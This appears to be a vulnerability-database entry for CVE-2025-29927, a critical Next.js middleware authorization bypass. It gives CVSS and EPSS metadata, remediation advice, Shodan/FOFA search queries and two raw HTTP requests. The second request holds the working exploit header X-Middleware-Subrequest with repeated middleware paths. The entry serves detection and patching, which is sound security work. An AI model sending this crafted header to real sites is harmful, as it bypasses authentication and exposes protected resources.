---
layout: post
cve_id: CVE-2025-29927
title: Next.js Middleware Bypass
pcap: true
pcap_path: /pcaps/2025/CVE-2025-29927.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-29927.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdresearch,pdteam,hazedic
severity: critical
impact: 'Unauthenticated attackers can bypass middleware security controls by sending
  crafted x-middleware-subrequest headers, potentially circumventing authorization
  checks and accessing protected resources.

  '
remediation: 'Upgrade to Next.js 14.2.25 or 15.2.3 or later. If upgrading is not possible,
  block the x-middleware-subrequest header at the WAF or server level.

  '
reference:
- https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
- https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
- https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/
classification:
  epss-score: 0.92896
  epss-percentile: 0.99758
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cwe-id: CWE-287
metadata:
  max-request: 1
  shodan-query: x-middleware-rewrite
  fofa-query: x-middleware-rewrite
  product: next.js
  vendor: zeit
tags:
- cve
- cve2025
- nextjs
- middleware
- auth-bypass
- vkev
- vuln
---

## üîç Vulnerability Description
Next.js contains a critical middleware bypass vulnerability affecting versions 11.1.4 through 15.2.2.
The vulnerability allows attackers to bypass middleware security controls by sending a specially crafted
'x-middleware-subrequest' header, which can lead to authorization bypass and other security control circumvention.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
X-Nextjs-Data: 1
Accept-Encoding: gzip
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.4 (x64 de)
Connection: close
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
X-Nextjs-Data: 1
Accept-Encoding: gzip
```

